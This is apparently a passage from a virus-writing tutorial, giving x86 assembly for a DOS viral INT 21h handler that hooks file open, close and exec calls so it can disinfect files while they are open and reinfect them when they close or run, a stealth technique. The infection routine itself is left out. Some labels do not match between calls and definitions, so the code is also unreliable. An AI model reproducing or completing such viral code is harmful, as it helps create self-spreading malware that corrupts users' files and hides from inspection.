
int_21:
           ....
           cmp ah,3dh        ; this is a part of viral
                             ; INT 21h handler
           je desinfect
           cmp ah,3eh
           je reinfect
           cmp ah,4bh
           je infect_file
           ....              ; here handler continiues

infect_file:
           pusha
           push ds
           push es
           or al,al          ; 4B00h
           jnz next
           call get_bastard    ; infect file
exit_exec:
           pop es
           pop ds
           popa
           jmp dword ptr cs:[original_INT21h]

next:      dec ax
           jnz exit_exec
           call open_file_DS_DX ; 4B01h
           call desinfect1
           jmp short exit_exec
get_bastard:
           ....              ; stuff deleted

           call_open_file_DS_DX
           jc exit_infect
get_bastard_handle:
           ....              ; file infection here
           ....
exit_infect:
           ret

desinfect: call open_file_DS_DX
           pushf
           pusha
           push ds
           push es
           call desinfect1
           pop es
           pop ds
           popa
           popf
           retf 2

desinfect1:

comment ~
Here you have to read the  saved stuff from infected file to
some memory buffer. Then truncate the file to its uninfected
size (by  writing 0 bytes to  file with file pointer  set to
the  location, where  the uninfected  file had  EOF). And as
last, restore the changed stuff from memory buffer and lseek
to start of the file. Do  not forget, if you alway open file
with  mode R/W  for any  DOS call,  you may  avoid nasty SFT
manipulation when reinfecting the file on its closing.
~
         .....   ; some code :))))


reinfect:
         pusha
         push ds
         push es
         call lseek_BOF
         call get_bastard_handle
         jmp exec_exit


